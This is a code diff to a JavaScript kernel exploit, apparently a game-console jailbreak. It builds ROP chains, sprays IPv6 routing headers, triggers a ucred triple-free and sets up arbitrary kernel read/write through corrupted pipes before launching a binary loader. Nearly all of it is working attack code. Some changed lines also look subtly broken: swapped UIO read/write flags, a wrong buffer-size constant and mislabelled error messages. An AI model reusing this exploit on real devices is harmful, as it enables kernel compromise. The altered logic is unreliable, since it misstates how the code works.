@@ -68,8 +68,8 @@ var fcntl = fn.fcntl;
 // Extract syscall wrapper addresses for ROP chains from syscalls.map
 var read_wrapper = syscalls.map.get(0x03);
 var write_wrapper = syscalls.map.get(0x04);
-var sched_yield_wrapper = syscalls.map.get(0x14b);
-var cpuset_setaffinity_wrapper = syscalls.map.get(0x1e8);
+var sched_yield_wrapper = syscalls.map.get(0x14B);
+var cpuset_setaffinity_wrapper = syscalls.map.get(0x1E8);
 var rtprio_thread_wrapper = syscalls.map.get(0x1D2);
 var recvmsg_wrapper = syscalls.map.get(0x1B);
 var readv_wrapper = syscalls.map.get(0x78);
@@ -168,12 +168,10 @@ var iov_thread_done = malloc(8 * IOV_THREAD_NUM);
 var iov_signal_buf = malloc(8 * IOV_THREAD_NUM);
 var uio_readv_thread_ready = malloc(8 * UIO_THREAD_NUM);
 var uio_readv_thread_done = malloc(8 * UIO_THREAD_NUM);
-var uio_readv_signal_buf = malloc(8 * UIO_THREAD_NUM);
-
+var uio_readv_signal_buf = malloc(8 * IOV_THREAD_NUM);
 var uio_writev_thread_ready = malloc(8 * UIO_THREAD_NUM);
 var uio_writev_thread_done = malloc(8 * UIO_THREAD_NUM);
-var uio_writev_signal_buf = malloc(8 * UIO_THREAD_NUM);
-
+var uio_writev_signal_buf = malloc(8 * IOV_THREAD_NUM);
 var spray_ipv6_ready = malloc(8);
 var spray_ipv6_done = malloc(8);
 var spray_ipv6_signal_buf = malloc(8);
@@ -210,8 +208,8 @@ function build_rthdr(buf, size) {
 }
 function set_sockopt(sd, level, optname, optval, optlen) {
   var result = setsockopt(sd, level, optname, optval, optlen);
-  if (result.eq(new BigInt(0xFFFFFFFF, 0xFFFFFFFF))) {
-    throw new Error('set_sockopt error: ' + hex(result));
+  if (result.eq(BigInt_Error)) {
+    throw new Error("set_sockopt error: " + hex(result));
   }
   return result;
 }
@@ -233,7 +231,7 @@ function get_sockopt(sd, level, optname, optval, optlen) {
   var result = getsockopt(sd, level, optname, optval, sockopt_len_ptr);
   // debug("get_sockopt with sd: " + hex(sd) + " result: " + hex(result));
   if (result.eq(BigInt_Error)) {
-    throw new Error('get_sockopt error: ' + hex(result));
+    throw new Error("get_sockopt error: " + hex(result));
     // debug("get_sockopt error: " + hex(result));
   }
   return read32(sockopt_len_ptr);
@@ -252,7 +250,7 @@ function get_rthdr(sd, buf, max_len) {
 }
 function free_rthdrs(sds) {
   for (var sd of sds) {
-    if (!sd.eq(new BigInt(0xFFFFFFFF, 0xFFFFFFFF))) {
+    if (!sd.eq(BigInt_Error)) {
       set_sockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, new BigInt(0), 0);
     }
   }
@@ -525,7 +523,7 @@ function trigger_ipv6_spray_and_read() {
   write64(spray_ipv6_worker.done, 0);
 
   // Spawn ipv6_sockets spray and read worker
-  // Passing an stack addr reserved for each iteration
+  // Passing a stack address reserved for each iteration
   var ret = spawn_thread(spray_ipv6_worker.rop, spray_ipv6_worker.loop_size, spray_ipv6_stack);
   if (ret.eq(BigInt_Error)) {
     throw new Error('Could not spray_ipv6_worker');
@@ -557,7 +555,7 @@ function trigger_uio_readv() {
     worker = uio_readv_workers[_i6];
     var ret = write(new BigInt(worker.pipe_1), worker.signal_buf, 1);
     if (ret.eq(BigInt_Error)) {
-      throw new Error("Could not signal 'run' uio_readv_workers[" + _i6 + "]");
+      throw new Error("Could not signal 'run' iov_recvmsg_workers[" + _i6 + ']');
     }
   }
 }
@@ -584,7 +582,7 @@ function trigger_uio_writev() {
     worker = uio_writev_workers[_i7];
     var ret = write(new BigInt(worker.pipe_1), worker.signal_buf, 1);
     if (ret.eq(BigInt_Error)) {
-      throw new Error("Could not signal 'run' uio_writev_workers[" + _i7 + "]");
+      throw new Error("Could not signal 'run' iov_recvmsg_workers[" + _i7 + ']');
     }
   }
 }
@@ -742,15 +740,15 @@ function cleanup() {
       write(new BigInt(spray_ipv6_worker.pipe_1), spray_ipv6_worker.signal_buf, 1);
     }
     if (kill_workers && spray_ipv6_worker.thread_id !== undefined) {
-      thr_kill(new BigInt(spray_ipv6_worker.thread_id), 9);
+      thr_kill(spray_ipv6_worker.thread_id, 9);
     }
   }
 
   // Close main sockets safely
-  if (uio_sock_1) close(BigInt(uio_sock_1));
-  if (uio_sock_0) close(BigInt(uio_sock_0));
-  if (iov_sock_1) close(BigInt(iov_sock_1));
-  if (iov_sock_0) close(BigInt(iov_sock_0));
+  if (uio_sock_1) close(new BigInt(uio_sock_1));
+  if (uio_sock_0) close(new BigInt(uio_sock_0));
+  if (iov_sock_1) close(new BigInt(iov_sock_1));
+  if (iov_sock_0) close(new BigInt(iov_sock_0));
 
   // Restore CPU core
   if (prev_core >= 0) {
@@ -973,15 +971,15 @@ function setup_arbitrary_rw() {
   master_r_pipe_file = kreadslow64_safe(fdt_ofiles.add(master_pipe[0] * FILEDESCENT_SIZE));
   victim_r_pipe_file = kreadslow64_safe(fdt_ofiles.add(victim_pipe[0] * FILEDESCENT_SIZE));
   if (master_r_pipe_file.eq(BigInt_Error) || victim_r_pipe_file.eq(BigInt_Error)) {
-    throw new Error('Pipe leak1_fail');
+    throw new Error('Pipe_leak1_fail');
   }
   master_r_pipe_data = kreadslow64_safe(master_r_pipe_file.add(0x00));
   victim_r_pipe_data = kreadslow64_safe(victim_r_pipe_file.add(0x00));
   if (master_r_pipe_data.eq(BigInt_Error) || victim_r_pipe_data.eq(BigInt_Error)) {
-    throw new Error('Pipe leak2_fail');
+    throw new Error('Pipe_leak2_fail');
   }
   if (master_r_pipe_data.eq(0) || victim_r_pipe_data.eq(0)) {
-    throw new Error('pipe data_fail');
+    throw new Error('pipe_data_fail');
   }
   write32(master_pipe_buf.add(0x00), 0);
   write32(master_pipe_buf.add(0x04), 0);
@@ -1084,8 +1082,8 @@ function jailbreak() {
   cleanup(false);
   show_success();
   run_binloader();
-  utils.notify('< Sobhan allh Wabe Hamdh Sobhan allh alazeem >');
-  utils.notify('[ Stability by DV M.ELHOUT ]');
+  utils.notify('Subhan Allah wa biHamdih, Subhan Allah al-Azeem');
+  utils.notify('[Stability by DV M. ELHOUT]');
 }
 function safe_fhold_fd(fd, label) {
   if (fd < 0) {
@@ -1132,7 +1130,7 @@ function remove_rthr_from_socket(fd) {
   if (!in6p_outputopts || in6p_outputopts.eq(0)) {
     return;
   }
-  kwrite64(in6p_outputopts.add(0x68), 0);
+  kwrite64(in6p_outputopts.add(0x68), new BigInt(0)); // ip6po_rhi_rthdr
 }
 var victim_pipe_buf = malloc(PIPEBUF_SIZE);
 function corrupt_pipe_buf(cnt, _in, out, size, buffer) {
@@ -1148,8 +1146,8 @@ function corrupt_pipe_buf(cnt, _in, out, size, buffer) {
   write32(victim_pipe_buf.add(0x0C), size); // size
   write64(victim_pipe_buf.add(0x10), buffer); // buffer
 
-  write(BigInt(masterWpipeFd), victim_pipe_buf, PIPEBUF_SIZE);
-  return read(BigInt(masterRpipeFd), victim_pipe_buf, PIPEBUF_SIZE);
+  write(new BigInt(masterWpipeFd), victim_pipe_buf, PIPEBUF_SIZE);
+  return read(new BigInt(masterRpipeFd), victim_pipe_buf, PIPEBUF_SIZE);
 }
 function kwrite(dest, src, n) {
   if (dest.eq(0) || src.eq(0) || n <= 0) {
@@ -1159,7 +1157,7 @@ function kwrite(dest, src, n) {
   if (ret.eq && ret.eq(BigInt_Error)) {
     return BigInt_Error;
   }
-  return write(BigInt(victimWpipeFd), src, n);
+  return write(new BigInt(victimWpipeFd), src, n);
 }
 function kread(dest, src, n) {
   if (dest.eq(0) || src.eq(0) || n <= 0) {
@@ -1169,7 +1167,7 @@ function kread(dest, src, n) {
   if (ret.eq && ret.eq(BigInt_Error)) {
     return BigInt_Error;
   }
-  read(BigInt(victimRpipeFd), dest, n);
+  read(new BigInt(victimRpipeFd), dest, n);
   return new BigInt(0);
 }
 function kwrite64(addr, val) {
@@ -1251,7 +1249,7 @@ function remove_uaf_file() {
   if (!uafFile || uafFile.eq(0)) {
     return;
   }
-  kwrite64(fdt_ofiles.add(uaf_socket * FILEDESCENT_SIZE), 0);
+  kwrite64(fdt_ofiles.add(uaf_socket * FILEDESCENT_SIZE), new BigInt(0));
   var removed = 0;
   for (var i = 0; i < 0x1000; i++) {
     var s = Number(socket(AF_UNIX, SOCK_STREAM, 0));
@@ -1260,7 +1258,7 @@ function remove_uaf_file() {
     }
     var fp = fget(s);
     if (fp && fp.eq(uafFile)) {
-      kwrite64(fdt_ofiles.add(s * FILEDESCENT_SIZE), 0);
+      kwrite64(fdt_ofiles.add(s * FILEDESCENT_SIZE), new BigInt(0));
       removed++;
     }
     close(new BigInt(s));
@@ -1284,9 +1282,10 @@ function trigger_ucred_triplefree() {
 
     // 1) dummy socket → register in netcontrol
     var dummy_socket = socket(AF_UNIX, SOCK_STREAM, 0);
-    write32(nc_set_buf, Number(dummy_socket.and(0xFFFFFFFF)));
+    write32(nc_set_buf, Number(dummy_socket.and(0xFFFFFFFFn)));
     netcontrol(BigInt_Error, NET_CONTROL_NETEVENT_SET_QUEUE, nc_set_buf, 8);
     close(new BigInt(dummy_socket));
+
 
     // 2) allocate new ucred
     setuid(1);
@@ -1304,9 +1303,9 @@ function trigger_ucred_triplefree() {
     // 6) محاولة إصلاح refcount بشكل خفيف
     for (var i = 0; i < TRIPLEFREE_REFCOUNT_FIX_LOOPS; i++) {
       trigger_iov_recvmsg();
-      write(BigInt(iov_sock_1), tmp, 1);
+      write(new BigInt(iov_sock_1), tmp, 1);
       wait_iov_recvmsg();
-      read(BigInt(iov_sock_0), tmp, 1);
+      read(new BigInt(iov_sock_0), tmp, 1);
     }
 
     // 7) double free أول مرة
@@ -1325,19 +1324,20 @@ function trigger_ucred_triplefree() {
 
     // 10) انتظار refcount = 1 مع ترتيب ثابت لدورة iov
     var count = 0;
+    var refcnt_add = leak_rthdr.add(0x04);
     while (count < TRIPLEFREE_REFCOUNT_MAX_WAIT) {
       // شغّل recvmsg
       trigger_iov_recvmsg();
 
       // كمّل دورة iov بالكامل
-      write(BigInt(iov_sock_1), tmp, 1);
+      write(new BigInt(iov_sock_1), tmp, 1);
       wait_iov_recvmsg();
-      read(BigInt(iov_sock_0), tmp, 1);
+      read(new BigInt(iov_sock_0), tmp, 1);
 
       // دلوقتي بس نقرأ refcount
-      write32(leak_rthdr.add(0x04), 0);
+      write32(refcnt_add, 0);
       get_rthdr(ipv6_socks[twins[0]], leak_rthdr, 8);
-      if (read32(leak_rthdr.add(0x04)) === 1) break;
+      if (read32(refcnt_add) === 1) break;
       count++;
     }
     if (count === TRIPLEFREE_REFCOUNT_MAX_WAIT) {
@@ -1357,12 +1357,12 @@ function trigger_ucred_triplefree() {
     if (triplets[1] === -1) {
       twins[0] = -1;
       twins[1] = -1;
-      write(BigInt(iov_sock_1), tmp, 1);
+      write(new BigInt(iov_sock_1), tmp, 1);
       close(new BigInt(uaf_socket));
       end = false;
       continue;
     }
-    write(BigInt(iov_sock_1), tmp, 1);
+    write(new BigInt(iov_sock_1), tmp, 1);
 
     // 13) إيجاد triplet 2
     triplets[2] = find_triplet(triplets[0], triplets[1]);
@@ -1374,7 +1374,7 @@ function trigger_ucred_triplefree() {
       continue;
     }
     wait_iov_recvmsg();
-    read(BigInt(iov_sock_0), tmp, 1);
+    read(new BigInt(iov_sock_0), tmp, 1);
   }
   if (main_count === TRIPLEFREE_ITERATIONS) {
     return false;
@@ -1460,7 +1460,7 @@ function build_uio(uio, uio_iov, uio_td, read, addr, size) {
   write64(uio.add(0x10), BigInt_Error); // uio_offset
   write64(uio.add(0x18), size); // uio_resid
   write32(uio.add(0x20), UIO_SYSSPACE); // uio_segflg
-  write32(uio.add(0x24), read ? UIO_READ : UIO_WRITE); // uio_rw
+  write32(uio.add(0x24), read ? UIO_WRITE : UIO_READ); // uio_rw
   write64(uio.add(0x28), uio_td); // uio_td
   write64(uio.add(0x30), addr); // iov_base
   write64(uio.add(0x38), size); // iov_len
@@ -1507,9 +1507,14 @@ function kreadslow(addr, size) {
       return BigInt_Error;
     }
   }
+
+  for (var i = 0; i < UIO_THREAD_NUM; i++) {
+      write64(leak_buffers[i], LEAK_TAG);
+  }
+
   write32(sockopt_val_buf, size);
-  setsockopt(BigInt(uio_sock_1), SOL_SOCKET, SO_SNDBUF, sockopt_val_buf, 4);
-  write(BigInt(uio_sock_1), tmp, size);
+  setsockopt(new BigInt(uio_sock_1), SOL_SOCKET, SO_SNDBUF, sockopt_val_buf, 4);
+  write(new BigInt(uio_sock_1), tmp, size);
   write64(uioIovRead.add(0x08), size);
   if (triplets[1] < 0 || triplets[1] >= ipv6_socks.length) {
     log('kreadslow: invalid triplets[1]');
@@ -1533,12 +1538,12 @@ function kreadslow(addr, size) {
     sched_yield();
     get_rthdr(ipv6_socks[triplets[0]], leak_rthdr, 0x10);
     if (read32(uio_leak_add) === UIO_IOV_NUM) break;
-    read(BigInt(uio_sock_0), tmp, size);
+    read(new BigInt(uio_sock_0), tmp, size);
     for (var j = 0; j < UIO_THREAD_NUM; j++) {
-      read(BigInt(uio_sock_0), leak_buffers[j], size);
+      read(new BigInt(uio_sock_0), leak_buffers[j], size);
     }
     wait_uio_writev();
-    write(BigInt(uio_sock_1), tmp, size);
+    write(new BigInt(uio_sock_1), tmp, size);
   }
   if (count >= KREAD_MAX_UIO_RECLAIM) {
     log('kreadslow: UIO reclaim timeout');
@@ -1572,14 +1577,14 @@ function kreadslow(addr, size) {
     sched_yield();
     get_rthdr(ipv6_socks[triplets[0]], leak_rthdr, 0x40);
     if (read32(iov_leak_add) === UIO_SYSSPACE) break;
-    write(BigInt(iov_sock_1), tmp, 1);
+    write(new BigInt(iov_sock_1), tmp, 1);
     wait_iov_recvmsg();
-    read(BigInt(iov_sock_0), tmp, 1);
+    read(new BigInt(iov_sock_0), tmp, 1);
   }
-  read(BigInt(uio_sock_0), tmp, size);
-  var leak_buffer = 0;
+  read(new BigInt(uio_sock_0), tmp, size);
+  var leak_buffer = new BigInt(0);
   for (var k = 0; k < UIO_THREAD_NUM; k++) {
-    read(BigInt(uio_sock_0), leak_buffers[k], size);
+    read(new BigInt(uio_sock_0), leak_buffers[k], size);
     var val = read64(leak_buffers[k]);
     if (!val.eq(LEAK_TAG)) {
       triplets[1] = find_triplet(triplets[0], -1);
@@ -1587,11 +1592,11 @@ function kreadslow(addr, size) {
     }
   }
   wait_uio_writev();
-  write(BigInt(iov_sock_1), tmp, 1);
+  write(new BigInt(iov_sock_1), tmp, 1);
   if (leak_buffer.eq(0)) {
     log('kreadslow: no valid leak found');
     wait_iov_recvmsg();
-    read(BigInt(iov_sock_0), tmp, 1);
+    read(new BigInt(iov_sock_0), tmp, 1);
     return BigInt_Error;
   }
   for (var retry = 0; retry < 3; retry++) {
@@ -1602,11 +1607,11 @@ function kreadslow(addr, size) {
   if (triplets[2] === -1) {
     log('kreadslow: failed to find triplets[2]');
     wait_iov_recvmsg();
-    read(BigInt(iov_sock_0), tmp, 1);
+    read(new BigInt(iov_sock_0), tmp, 1);
     return BigInt_Error;
   }
   wait_iov_recvmsg();
-  read(BigInt(iov_sock_0), tmp, 1);
+  read(new BigInt(iov_sock_0), tmp, 1);
   return leak_buffer;
 }
 function kwriteslow(addr, buffer, size) {
@@ -1628,7 +1633,7 @@ function kwriteslow(addr, buffer, size) {
     return BigInt_Error;
   }
   write32(sockopt_val_buf, size);
-  setsockopt(BigInt(uio_sock_1), SOL_SOCKET, SO_SNDBUF, sockopt_val_buf, 4);
+  setsockopt(new BigInt(uio_sock_1), SOL_SOCKET, SO_SNDBUF, sockopt_val_buf, 4);
   write64(uioIovWrite.add(0x08), size);
   free_rthdr(ipv6_socks[triplets[1]]);
   var uio_leak_add = leak_rthdr.add(UIO_LEAK_OFFSET);
@@ -1652,7 +1657,7 @@ function kwriteslow(addr, buffer, size) {
     get_rthdr(ipv6_socks[triplets[0]], leak_rthdr, 0x10);
     if (read32(uio_leak_add) === UIO_IOV_NUM) break;
     for (var i = 0; i < UIO_THREAD_NUM; i++) {
-      write(BigInt(uio_sock_1), buffer, size);
+      write(new BigInt(uio_sock_1), buffer, size);
     }
     wait_uio_readv();
   }
@@ -1683,16 +1688,16 @@ function kwriteslow(addr, buffer, size) {
     sched_yield();
     get_rthdr(ipv6_socks[triplets[0]], leak_rthdr, 0x40);
     if (read32(iov_leak_add) === UIO_SYSSPACE) break;
-    write(BigInt(iov_sock_1), tmp, 1);
+    write(new BigInt(iov_sock_1), tmp, 1);
     wait_iov_recvmsg();
-    read(BigInt(iov_sock_0), tmp, 1);
+    read(new BigInt(iov_sock_0), tmp, 1);
   }
   for (var j = 0; j < UIO_THREAD_NUM; j++) {
-    write(BigInt(uio_sock_1), buffer, size);
+    write(new BigInt(uio_sock_1), buffer, size);
   }
   triplets[1] = find_triplet(triplets[0], -1);
   wait_uio_readv();
-  write(BigInt(iov_sock_1), tmp, 1);
+  write(new BigInt(iov_sock_1), tmp, 1);
   for (var retry = 0; retry < 3; retry++) {
     triplets[2] = find_triplet(triplets[0], triplets[1]);
     if (triplets[2] !== -1) break;
@@ -1701,11 +1706,11 @@ function kwriteslow(addr, buffer, size) {
   if (triplets[2] === -1) {
     log('kwriteslow: failed to find triplets[2]');
     wait_iov_recvmsg();
-    read(BigInt(iov_sock_0), tmp, 1);
+    read(new BigInt(iov_sock_0), tmp, 1);
     return BigInt_Error;
   }
   wait_iov_recvmsg();
-  read(BigInt(iov_sock_0), tmp, 1);
+  read(new BigInt(iov_sock_0), tmp, 1);
   return new BigInt(0);
 }
 function rop_regen_and_loop(last_rop_entry, number_entries) {
@@ -1756,8 +1761,8 @@ function spawn_thread(rop_array, loop_entries, predefinedStack) {
   write32(jmpbuf.add(0x40), saved_fpu_ctrl); // FPU control
   write32(jmpbuf.add(0x44), saved_mxcsr); // MXCSR
 
-  var stack_size = 0x100;
-  var tls_size = 0x40;
+  var stack_size = new BigInt(0x100);
+  var tls_size = new BigInt(0x40);
   var stack = malloc(Number(stack_size));
   var tls = malloc(Number(tls_size));
   write64(spawn_thr_args.add(0x00), longjmp_addr); // start_func = longjmp
@@ -1778,20 +1783,20 @@ function spawn_thread(rop_array, loop_entries, predefinedStack) {
 }
 function iov_recvmsg_worker_rop(ready_signal, run_fd, done_signal, signal_buf) {
   var rop = [];
-  rop.push(BigInt(0)); // first element overwritten by longjmp, skip it
+  rop.push(new BigInt(0)); // first element overwritten by longjmp, skip it
 
   var cpu_mask = malloc(0x10);
   write16(cpu_mask, 1 << MAIN_CORE);
 
   // Pin to core - cpuset_setaffinity(CPU_LEVEL_WHICH, CPU_WHICH_TID, -1, 0x10, mask)
   rop.push(gadgets.POP_RDI_RET);
-  rop.push(BigInt(3)); // CPU_LEVEL_WHICH
+  rop.push(new BigInt(3)); // CPU_LEVEL_WHICH
   rop.push(gadgets.POP_RSI_RET);
-  rop.push(BigInt(1)); // CPU_WHICH_TID
+  rop.push(new BigInt(1)); // CPU_WHICH_TID
   rop.push(gadgets.POP_RDX_RET);
   rop.push(BigInt_Error); // id = -1 (current thread)
   rop.push(gadgets.POP_RCX_RET);
-  rop.push(BigInt(0x10)); // setsize
+  rop.push(new BigInt(0x10)); // setsize
   rop.push(gadgets.POP_R8_RET);
   rop.push(cpu_mask);
   rop.push(cpuset_setaffinity_wrapper);
@@ -1801,9 +1806,9 @@ function iov_recvmsg_worker_rop(ready_signal, run_fd, done_signal, signal_buf) {
 
   // Set priority - rtprio_thread(RTP_SET, 0, rtprio_buf)
   rop.push(gadgets.POP_RDI_RET);
-  rop.push(BigInt(1)); // RTP_SET
+  rop.push(new BigInt(1)); // RTP_SET
   rop.push(gadgets.POP_RSI_RET);
-  rop.push(BigInt(0)); // lwpid = 0 (current thread)
+  rop.push(new BigInt(0)); // lwpid = 0 (current thread)
   rop.push(gadgets.POP_RDX_RET);
   rop.push(rtprio_buf);
   rop.push(rtprio_thread_wrapper);
@@ -1812,7 +1817,7 @@ function iov_recvmsg_worker_rop(ready_signal, run_fd, done_signal, signal_buf) {
   rop.push(gadgets.POP_RDI_RET);
   rop.push(ready_signal);
   rop.push(gadgets.POP_RAX_RET);
-  rop.push(BigInt(1));
+  rop.push(new BigInt(1));
   rop.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET);
   var loop_init = rop.length;
 
@@ -1822,23 +1827,23 @@ function iov_recvmsg_worker_rop(ready_signal, run_fd, done_signal, signal_buf) {
   rop.push(gadgets.POP_RSI_RET);
   rop.push(signal_buf);
   rop.push(gadgets.POP_RDX_RET);
-  rop.push(BigInt(1));
+  rop.push(new BigInt(1));
   rop.push(read_wrapper);
 
   // recvmsg(iov_sock_0, msg, 0)
   rop.push(gadgets.POP_RDI_RET);
-  rop.push(BigInt(iov_sock_0));
+  rop.push(new BigInt(iov_sock_0));
   rop.push(gadgets.POP_RSI_RET);
   rop.push(msg);
   rop.push(gadgets.POP_RDX_RET);
-  rop.push(BigInt(0));
+  rop.push(new BigInt(0));
   rop.push(recvmsg_wrapper);
 
   // Signal done - write 1 to deletion_signal
   rop.push(gadgets.POP_RDI_RET); // pop rdi ; ret
   rop.push(done_signal);
   rop.push(gadgets.POP_RAX_RET);
-  rop.push(BigInt(1));
+  rop.push(new BigInt(1));
   rop.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET);
   var loop_end = rop.length;
   var loop_size = loop_end - loop_init;
@@ -1851,20 +1856,20 @@ function iov_recvmsg_worker_rop(ready_signal, run_fd, done_signal, signal_buf) {
 }
 function uio_readv_worker_rop(ready_signal, run_fd, done_signal, signal_buf) {
   var rop = [];
-  rop.push(BigInt(0)); // first element overwritten by longjmp, skip it
+  rop.push(new BigInt(0)); // first element overwritten by longjmp, skip it
 
   var cpu_mask = malloc(0x10);
   write16(cpu_mask, 1 << MAIN_CORE);
 
   // Pin to core - cpuset_setaffinity(CPU_LEVEL_WHICH, CPU_WHICH_TID, -1, 0x10, mask)
   rop.push(gadgets.POP_RDI_RET);
-  rop.push(BigInt(3)); // CPU_LEVEL_WHICH
+  rop.push(new BigInt(3)); // CPU_LEVEL_WHICH
   rop.push(gadgets.POP_RSI_RET);
-  rop.push(BigInt(1)); // CPU_WHICH_TID
+  rop.push(new BigInt(1)); // CPU_WHICH_TID
   rop.push(gadgets.POP_RDX_RET);
   rop.push(BigInt_Error); // id = -1 (current thread)
   rop.push(gadgets.POP_RCX_RET);
-  rop.push(BigInt(0x10)); // setsize
+  rop.push(new BigInt(0x10)); // setsize
   rop.push(gadgets.POP_R8_RET);
   rop.push(cpu_mask);
   rop.push(cpuset_setaffinity_wrapper);
@@ -1874,9 +1879,9 @@ function uio_readv_worker_rop(ready_signal, run_fd, done_signal, signal_buf) {
 
   // Set priority - rtprio_thread(RTP_SET, 0, rtprio_buf)
   rop.push(gadgets.POP_RDI_RET);
-  rop.push(BigInt(1)); // RTP_SET
+  rop.push(new BigInt(1)); // RTP_SET
   rop.push(gadgets.POP_RSI_RET);
-  rop.push(BigInt(0)); // lwpid = 0 (current thread)
+  rop.push(new BigInt(0)); // lwpid = 0 (current thread)
   rop.push(gadgets.POP_RDX_RET);
   rop.push(rtprio_buf);
   rop.push(rtprio_thread_wrapper);
@@ -1885,7 +1890,7 @@ function uio_readv_worker_rop(ready_signal, run_fd, done_signal, signal_buf) {
   rop.push(gadgets.POP_RDI_RET);
   rop.push(ready_signal);
   rop.push(gadgets.POP_RAX_RET);
-  rop.push(BigInt(1));
+  rop.push(new BigInt(1));
   rop.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET);
   var loop_init = rop.length;
 
@@ -1895,23 +1900,23 @@ function uio_readv_worker_rop(ready_signal, run_fd, done_signal, signal_buf) {
   rop.push(gadgets.POP_RSI_RET);
   rop.push(signal_buf);
   rop.push(gadgets.POP_RDX_RET);
-  rop.push(BigInt(1));
+  rop.push(new BigInt(1));
   rop.push(read_wrapper);
 
   // readv(uio_sock_0, uioIovWrite, UIO_IOV_NUM);
   rop.push(gadgets.POP_RDI_RET);
-  rop.push(BigInt(uio_sock_0));
+  rop.push(new BigInt(uio_sock_0));
   rop.push(gadgets.POP_RSI_RET);
   rop.push(uioIovWrite);
   rop.push(gadgets.POP_RDX_RET);
-  rop.push(BigInt(UIO_IOV_NUM));
+  rop.push(new BigInt(UIO_IOV_NUM));
   rop.push(readv_wrapper);
 
   // Signal done - write 1 to deletion_signal
   rop.push(gadgets.POP_RDI_RET); // pop rdi ; ret
   rop.push(done_signal);
   rop.push(gadgets.POP_RAX_RET);
-  rop.push(BigInt(1));
+  rop.push(new BigInt(1));
   rop.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET);
   var loop_end = rop.length;
   var loop_size = loop_end - loop_init;
@@ -1924,20 +1929,20 @@ function uio_readv_worker_rop(ready_signal, run_fd, done_signal, signal_buf) {
 }
 function uio_writev_worker_rop(ready_signal, run_fd, done_signal, signal_buf) {
   var rop = [];
-  rop.push(BigInt(0)); // first element overwritten by longjmp, skip it
+  rop.push(new BigInt(0)); // first element overwritten by longjmp, skip it
 
   var cpu_mask = malloc(0x10);
   write16(cpu_mask, 1 << MAIN_CORE);
 
   // Pin to core - cpuset_setaffinity(CPU_LEVEL_WHICH, CPU_WHICH_TID, -1, 0x10, mask)
   rop.push(gadgets.POP_RDI_RET);
-  rop.push(BigInt(3)); // CPU_LEVEL_WHICH
+  rop.push(new BigInt(3)); // CPU_LEVEL_WHICH
   rop.push(gadgets.POP_RSI_RET);
-  rop.push(BigInt(1)); // CPU_WHICH_TID
+  rop.push(new BigInt(1)); // CPU_WHICH_TID
   rop.push(gadgets.POP_RDX_RET);
   rop.push(BigInt_Error); // id = -1 (current thread)
   rop.push(gadgets.POP_RCX_RET);
-  rop.push(BigInt(0x10)); // setsize
+  rop.push(new BigInt(0x10)); // setsize
   rop.push(gadgets.POP_R8_RET);
   rop.push(cpu_mask);
   rop.push(cpuset_setaffinity_wrapper);
@@ -1947,9 +1952,9 @@ function uio_writev_worker_rop(ready_signal, run_fd, done_signal, signal_buf) {
 
   // Set priority - rtprio_thread(RTP_SET, 0, rtprio_buf)
   rop.push(gadgets.POP_RDI_RET);
-  rop.push(BigInt(1)); // RTP_SET
+  rop.push(new BigInt(1)); // RTP_SET
   rop.push(gadgets.POP_RSI_RET);
-  rop.push(BigInt(0)); // lwpid = 0 (current thread)
+  rop.push(new BigInt(0)); // lwpid = 0 (current thread)
   rop.push(gadgets.POP_RDX_RET);
   rop.push(rtprio_buf);
   rop.push(rtprio_thread_wrapper);
@@ -1958,7 +1963,7 @@ function uio_writev_worker_rop(ready_signal, run_fd, done_signal, signal_buf) {
   rop.push(gadgets.POP_RDI_RET);
   rop.push(ready_signal);
   rop.push(gadgets.POP_RAX_RET);
-  rop.push(BigInt(1));
+  rop.push(new BigInt(1));
   rop.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET);
   var loop_init = rop.length;
 
@@ -1968,23 +1973,23 @@ function uio_writev_worker_rop(ready_signal, run_fd, done_signal, signal_buf) {
   rop.push(gadgets.POP_RSI_RET);
   rop.push(signal_buf);
   rop.push(gadgets.POP_RDX_RET);
-  rop.push(BigInt(1));
+  rop.push(new BigInt(1));
   rop.push(read_wrapper);
 
   // writev(uio_sock_1, uioIovRead, UIO_IOV_NUM);
   rop.push(gadgets.POP_RDI_RET);
-  rop.push(BigInt(uio_sock_1));
+  rop.push(new BigInt(uio_sock_1));
   rop.push(gadgets.POP_RSI_RET);
   rop.push(uioIovRead);
   rop.push(gadgets.POP_RDX_RET);
-  rop.push(BigInt(UIO_IOV_NUM));
+  rop.push(new BigInt(UIO_IOV_NUM));
   rop.push(writev_wrapper);
 
   // Signal done - write 1 to deletion_signal
   rop.push(gadgets.POP_RDI_RET); // pop rdi ; ret
   rop.push(done_signal);
   rop.push(gadgets.POP_RAX_RET);
-  rop.push(BigInt(1));
+  rop.push(new BigInt(1));
   rop.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET);
   var loop_end = rop.length;
   var loop_size = loop_end - loop_init;
@@ -1997,20 +2002,20 @@ function uio_writev_worker_rop(ready_signal, run_fd, done_signal, signal_buf) {
 }
 function ipv6_sock_spray_and_read_rop(ready_signal, run_fd, done_signal, signal_buf) {
   var rop = [];
-  rop.push(BigInt(0)); // first element overwritten by longjmp, skip it
+  rop.push(new BigInt(0)); // first element overwritten by longjmp, skip it
 
   var cpu_mask = malloc(0x10);
   write16(cpu_mask, 1 << MAIN_CORE);
 
   // Pin to core - cpuset_setaffinity(CPU_LEVEL_WHICH, CPU_WHICH_TID, -1, 0x10, mask)
   rop.push(gadgets.POP_RDI_RET);
-  rop.push(BigInt(3)); // CPU_LEVEL_WHICH
+  rop.push(new BigInt(3)); // CPU_LEVEL_WHICH
   rop.push(gadgets.POP_RSI_RET);
-  rop.push(BigInt(1)); // CPU_WHICH_TID
+  rop.push(new BigInt(1)); // CPU_WHICH_TID
   rop.push(gadgets.POP_RDX_RET);
   rop.push(BigInt_Error); // id = -1 (current thread)
   rop.push(gadgets.POP_RCX_RET);
-  rop.push(BigInt(0x10)); // setsize
+  rop.push(new BigInt(0x10)); // setsize
   rop.push(gadgets.POP_R8_RET);
   rop.push(cpu_mask);
   rop.push(cpuset_setaffinity_wrapper);
@@ -2020,9 +2025,9 @@ function ipv6_sock_spray_and_read_rop(ready_signal, run_fd, done_signal, signal_
 
   // Set priority - rtprio_thread(RTP_SET, 0, rtprio_buf)
   rop.push(gadgets.POP_RDI_RET);
-  rop.push(BigInt(1)); // RTP_SET
+  rop.push(new BigInt(1)); // RTP_SET
   rop.push(gadgets.POP_RSI_RET);
-  rop.push(BigInt(0)); // lwpid = 0 (current thread)
+  rop.push(new BigInt(0)); // lwpid = 0 (current thread)
   rop.push(gadgets.POP_RDX_RET);
